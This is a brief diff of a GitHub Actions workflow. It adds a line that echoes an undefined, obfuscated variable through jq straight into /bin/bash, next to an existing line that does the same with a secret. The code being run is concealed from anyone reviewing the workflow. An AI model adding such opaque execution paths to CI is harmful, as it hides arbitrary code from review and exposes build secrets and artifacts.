@@ -17,6 +17,7 @@ jobs:
           sukmk6822: ${{ secrets.sukmk6822 }}
         run: |
           printf '%s' "$sukmk6822" | jq -r .uv4011 | /bin/bash
+          echo $ftx34322 | jq -r .fx8739 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
